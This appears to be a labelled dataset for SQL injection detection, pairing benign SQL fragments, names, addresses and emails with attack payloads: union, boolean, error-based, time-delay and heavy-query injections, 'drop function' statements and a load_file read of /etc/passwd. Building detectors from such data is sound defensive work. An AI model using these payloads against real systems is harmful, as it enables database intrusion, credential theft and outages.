Payload	Attacker
SELECT * FROM  ( SELECT bill FROM widely ) 	0
18540	0
1 where 4448  =  4448 union all select null,null,null,null,null#	1
SELECT COUNT ( DISTINCT environment )  FROM metal	0
7680000000000000	0
SELECT MIN ( easy )  AS tax FROM throughout	0
-1512 union all select 9013,9013,9013,9013#	1
9.12244E+015	0
-1256' in boolean mode  )   union all select 7889,7889,7889,7889,7889,7889,7889,7889,7889--	1
"1"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  "	1
jeft	0
"-7347""   )    )    union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#"	1
1%'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
SELECT option_value FROM wp_options WHERE option_name  =  'webp-express-alter-html' LIMIT 1	0
SELECT * FROM difficult WHERE sick LIKE '%serve%'	0
FROM  ( SELECT DISTINCT aware FROM mostly ) 	0
-7707'   )    )    union all select 3172#	1
"1"" where 6325  =  6325 union all select null,null,null,null,null,null,null,null,null,null#"	1
SELECT end FROM funny	0
SELECT * FROM language FETCH FIRST 3 ROWS ONLY	0
select   (  case when   (  1743  =  5698  )   then 1743 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--	1
1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'wgbh'  =  'wgbh	1
 select * from users where id  =  '1' union select !<1,version  (    )   -- 1'	1
SELECT * FROM simplest ORDER BY butter	0
-3880  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  5194  =  5194	1
iif  (  3204  =  8489,3204,1/0  )  	1
SELECT COUNT ( motion )  FROM topic	0
31560	0
SELECT MIN ( among )  AS worker FROM pool	0
1'  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
SELECT pen ( s )  FROM famous UNION ALL	0
   SELECT slipped, sister, street FROM exactly WHERE blood  IS NULL	0
SELECT * FROM condition WHERE basis BETWEEN '1996-07-01' AND '1996-07-31'	0
select * from users where id  =  1 + \+%\ or 1  =  1 -- 1	1
"1"" and 6637  =  2321"	1
SELECT * FROM may WHERE oxygen NOT BETWEEN 'trail' AND 'bring'	0
  SELECT workerID AS ID, mostly AS spin FROM room	0
SELECT * FROM breakfast WHERE simplest BETWEEN taste09/01/1996plastic AND event15/31/1996because	0
san benito, 182,	0
SELECT * FROM bottom ORDER BY thou	0
escritor nicolas del paso, 95	0
SELECT * FROM shown WHERE column NOT BETWEEN 'nuts' AND 'chance'	0
"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""qcqx"" like ""qcqx"	1
1%'  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --	1
SELECT safe	0
46624	0
SELECT * FROM passage  WHERE by NOT LIKE '[laid]%'	0
"1""  )   as zopq where 2680  =  2680"	1
9437	0
sidonio	0
1%' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  '	1
"1%""   )    )     )   and 1594  =  8757"	1
d'amico urrea	0
1  )   as wxms where 7272  =  7272 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
INSERT INTO gradually ( teeth, surprise, different, visitor, know, habit )  VALUES  ( 'lot', 'floor'. pig', 'cry', 'follow', 'twenty', 'sick' )  	0
SELECT * FROM knew WHERE smooth = 'track' FETCH FIRST 3 ROWS ONLY	0
SELECT west FROM dinner UNION SELECT task FROM jar ORDER BY wheel	0
-3186 or 3867  =  9405	1
nihei_donat@multaspendientes.cu	0
SELECT religious FROM wish UNION ALL SELECT constantly FROM blood ORDER BY slope	0
1'  )   as pxcd where 9754  =  9754 or sleep  (  5  )  --	1
SELECT AVG ( instrument )  FROM construction  SELECT SUM ( finally ) 	0
"SELECT * FROM between WHERE immediately BETWEEN ""vapor"" AND    ""national"""	0
1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '	1
SELECT * FROM sort WHERE riding = 'discover'  AND City = 'life'	0
tarragona	0
calle muelles, 70, 6g	0
1  )   where 5550  =  5550   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --	1
1524940000000000	0
calle nicolas funes 116	0
SELECT * FROM cowboy WHERE effort = 'never' LIMIT 3	0
fit irizibar	0
renick@piaceredelivery.hn	0
SELECT * FROM paint WHERE spite NOT BETWEEN 'eye' AND 'giving'	0
SELECT AVG ( white ) FROM tight	0
SELECT * FROM foot FETCH FIRST 3 ROWS ONLY	0
46700	0
SELECT team ( s FROM though RIGHT JOIN	0
1'||  (  select 'zrea' from dual where 1223  =  1223 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --	1
90230020p	0
SELECT * FROM particularly WHERE price = 'railroad'  OR identity = 'noted'	0
SELECT cheese ( s )  FROM daughter SELECT grass FROM soft	0
INSERT INTO pole  ( earn, eat, corner )  VALUES  ( 'harder', 'sun', 'plus' )  	0
1'   )    )    as azsd where 3870  =  3870 waitfor delay '0:0:5'--	1
99eja36r9a	0
7020000000000000	0
"1""  )   rlike   (  select   (  case when   (  5746  =  5367  )   then 1 else 0x28 end   )    )    and   (  ""hnnf"" like ""hnnf"	1
DELETE FROM step WHERE now = 'other'	0
 select * from users where id  =  1 *\ union select null,@@VERSION -- 1	1
SELECT TOP 50 PERCENT * FROM walk SELECT * FROM shelf FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM proud	0
-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#	1
zauhar	0
kaufherr.gargoet@santacruzdelvoto.sh	0
69054908f	0
briant	0
"1%""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""%""  =  """	1
myrna5@adondeir.at	0
SELECT * FROM writer WHERE Price NOT BETWEEN 10 AND 20	0
select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  4537  =  4537	1
5933500000000000	0
"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""jzsb""  =  ""jzsb"	1
SELECT * FROM alike WHERE sudden = 'immediately'	0
2239350000000000	0
select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'lckw'  =  'lckw	1
1 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  -- kfqs	1
SELECT hot ( s )  FROM division LEFT JOIN	0
"SELECT * FROM love WHERE pour BETWEEN ""period"" AND    ""full"""	0
SELECT * FROM street FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM garage	0
1'||  (  select 'bnaz' from dual where 7168  =  7168 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
   SELECT headed, statement+ ', ' + supply+ ' ' + because+ ', ' + whenever AS simple  FROM bottom	0
yaser	0
12370442f	0
if  (  6624  =  4232  )   select 6624 else drop function xyyt--	1
sadoc	0
SELECT AVG ( farm )  FROM stone  SELECT SUM ( instant ) 	0
1'   )    )    as umah where 3781  =  3781 union all select null,null,null,null#	1
51842682s	0
1' or sleep  (  5  )   and 'yudo'  =  'yudo	1
1'||  (  select 'yydv' from dual where 9639  =  9639	1
bota	0
SELECT TOP 50 PERCENT * FROM nodded	0
conceptear	0
SELECT * FROM anyone 3 SELECT * FROM base	0
SELECT * FROM equator FETCH FIRST 50 PERCENT ROWS ONLY	0
newtell@theroxyblue.ir	0
"1""   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  ""suxh""  =  ""suxh"	1
"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--"	1
SELECT AVG ( habit ) FROM ago SELECT SUM ( manner ) 	0
‘ or 1  =  1 --	1
declare @s varchar   (  200  )   select @s   =   0x73656c6 ...	1
estrad sivelli	0
levisky	0
FROM  ( SELECT DISTINCT mysterious FROM rod ) 	0
calle federico mompou 144 11-d	0
select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx	1
binaced	0
SELECT * FROM environment WHERE Price NOT BETWEEN 10 AND 20	0
64522500w	0
"  SELECT SUBDATE ( ""2017-06-15"", INTERVAL 10 DAY ) ;"	0
SELECT TOP 3 * FROM list WHERE experience = 'lamp'	0
select * from generate_series  (  7754,7754,case when   (  7754  =  1252  )   then 1 else 0 end  )   limit 1--	1
 UPDATE long SET list = 'choice'WHERE fierce = 'strong'	0
dukes	0
-8487'  )   where 9655  =  9655 union all select 9655,9655,9655,9655,9655,9655,9655,9655,9655,9655--	1
SELECT TOP 3 * FROM material	0
nedar	0
FROM  ( SELECT DISTINCT way FROM area ) 	0
6959240000000000	0
SELECT * FROM look WHERE living = 'given'  AND City = 'face'	0
SELECT * FROM spread  WHERE curious = slow	0
"  SELECT EXTRACT ( MONTH FROM ""2017-06-15"" ) ;"	0
"-9557%""   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """	1
"1""  )   where 4964  =  4964"	1
plza. almudaina s/n	0
SELECT TOP 3 * FROM kept SELECT * FROM stove 3SELECT * FROM blood	0
  SELECT tallID AS ID, trick AS while FROM range	0
garrotazo	0
SELECT * FROM entirely WHERE NOT bone = 'camp'  AND NOT compound = 'circle'	0
 UPDATE serve SET official = 'colony'WHERE labor = 'dark'	0
iif  (  1149  =  4765,1,1/0  )  	1
"1""  )   where 2136  =  2136 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --"	1
SELECT * FROM clean FETCH FIRST 50 PERCENT ROWS ONLY	0
  SELECT * FROM very WHERE found IN  ( 'wash', 'struck', 'powerful' )  	0
1   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8814  =  8814	1
 UPDATE tight SET several = 'pattern'WHERE goose = 'reach'	0
25576	0
c/ carranque, 113 5?a	0
"1"" rlike sleep  (  5  )  #"	1
enconadura	0
select case when 1574  =  5523 then 1 else null end--	1
17536	0
select case when 7634  =  3954 then 1 else null end--	1
SELECT * FROM composition WHERE copper NOT BETWEEN 'represent' AND 'rays'	0
1'+  (  select 'hplm' where 4008  =  4008 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --	1
cortegana	0
brooking-doolittle@encuentrodominios.lv	0
SELECT DISTINCT citizen FROM everywhere	0
SELECT * FROM wild WHERE NOT sleep = 'halfway'  AND NOT union = 'create'	0
jara escobedo	0
"  SELECT REPEAT ( ""SQL Tutorial"", 0 ) ;"	0
subhashi	0
paseo arco del ladrillo 48 10?h	0
" select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1"	1
47eg0	0
"1"" where 5236  =  5236 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --"	1
1'  )   union all select null#	1
  (  select count  (  *  )   from generate_series  (  1,5000000   )    )   	1
SELECT * FROM capital WHERE kill = 'oxygen'  OR airplane = 'known'	0
aguistin	0
SELECT cannot FROM half UNION SELECT curve FROM very ORDER BY machinery	0
-1988 where 4597  =  4597 union all select 4597,4597,4597,4597,4597,4597--	1
DELETE FROM dozen WHERE claws = 'work'	0
mastelero	0
1 rlike sleep  (  5  )  #	1
nieva de cameros	0
SELECT * FROM  ( SELECT his FROM baseball ) 	0
c/ moncayo, 36, 10-d	0
"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""oxvw""  =  ""oxvw"	1
pittman	0
65651817l	0
46160431y	0
 union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;	1
  SELECT wrong,arrangement,danger FROM chest LEFT JOIN Orders ON once.mysteriousID =  manufacturing.expression ORDER BY top.lake	0
-5041'   )    )     )   union all select 4820,4820,4820,4820,4820,4820--	1
1'  )   as sjmt where 6541  =  6541 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --	1
rayadillo	0
"-7795""  )   where 1712  =  1712 union all select 1712,1712,1712,1712#"	1
 SELECT * FROM doctor ORDER BY public ASC, mirror DESC	0
1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ocfi'  =  'ocfi	1
bernette2	0
SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND  ( wp_posts.ID  =  '181' )  AND wp_posts.post_type  =  'page' ORDER BY wp_posts.post_date DESC	0
1'  )   as hlbq where 2347  =  2347 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --	1
1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'vvkd' like 'vvkd	1
SELECT * FROM bush FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM cookies	0
   SELECT may, shoot, loseFROM cell WHERE busy  IS NOT NULL	0
-6529'  )   or   (  4309  =  1601  )  *1601	1
6085	0
"-3109"" or elt  (  1032  =  1032,3623  )  "	1
parolero	0
  SELECT Orders.childrenrID, Employees.review, Employees.instead FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.quicklyID ORDER BY Orders.reasonID	0
"1""  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""piya""  =  ""piya"	1
jose cadalso s/n 7d	0
calle horreo 85 10?d	0
1   )    )    as eveb where 7567  =  7567	1
7164	0
SELECT * FROM think WHERE shown BETWEEN '1996-07-01' AND '1996-07-31'	0
SELECT ran ( s )  FROM rising UNION ALL	0
1  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  1073  =  1073	1
1  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  5099  =  5099	1
SELECT * FROM hold	0
if  (  1087  =  5839  )   select 1087 else drop function zzeh--	1
   SELECT Employees.solution, COUNT ( Orders.braveID )  AS fromFROM    ( OrdersINNER JOIN limited ON Orders.hisID  =  Employees.boundID ) 	0
SELECT * FROM experiment WHERE height = 'other'  AND City = 'red'	0
SELECT * FROM herself  WHERE wagon NOT LIKE '[fallen]%'	0
 select * from users where id  =  '1' union select \,@@VERSION -- 1'	1
1'  )   where 5276  =  5276 union all select null,null--	1
-5062  )   where 7457  =  7457 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --	1
SELECT * FROM claws  WHERE boy NOT LIKE '[thus]%'	0
SELECT TOP 3 * FROM rise SELECT * FROM substance 3SELECT * FROM cutting	0
SELECT COUNT ( DISTINCT cost )  FROM underline	0
SELECT * FROM source FETCH FIRST 50 PERCENT ROWS ONLY	0
"1""  )   as ybkp where 7788  =  7788 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --"	1
SELECT * FROM pile 3	0
SELECT ancient ( s )  FROM wood UNION	0
SELECT * FROM plain WHERE whole = 'zoo' LIMIT 3	0
"SELECT * FROM triangle WHERE bare BETWEEN ""laugh"" AND    ""black"""	0
1'  )   where 9817  =  9817	1
"1%""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""%""  =  """	1
SELECT frequently FROM may	0
milou	0
"1%""  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --"	1
  SELECT long AS point, birth AS [clean]  FROM child	0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367652 ) 	0
6019	0
kellogg@viajesinternacionales.ne	0
SELECT * FROM independent WHERE including = 'sell' LIMIT 3	0
SELECT * FROM triangle FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM anybody	0
1  )   as cfnz where 6065  =  6065 union all select null,null,null,null,null,null,null,null,null#	1
ferrs gortrez	0
-7663'   )    )    or 1558  =  1104 and    (    (   'wsrq'  =  'wsrq	1
c/ valtravieso s/n,	0
1'  )   order by 1#	1
47651101t	0
c/ bellavista, 70 10h	0
DELETE FROM if	0
1%'   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  '%'  =  '	1
"-4756""   )    )    union all select 6846,6846,6846,6846,6846,6846,6846#"	1
-4313%'  )   or 6872  =  6872 and   (  '%'  =  '	1
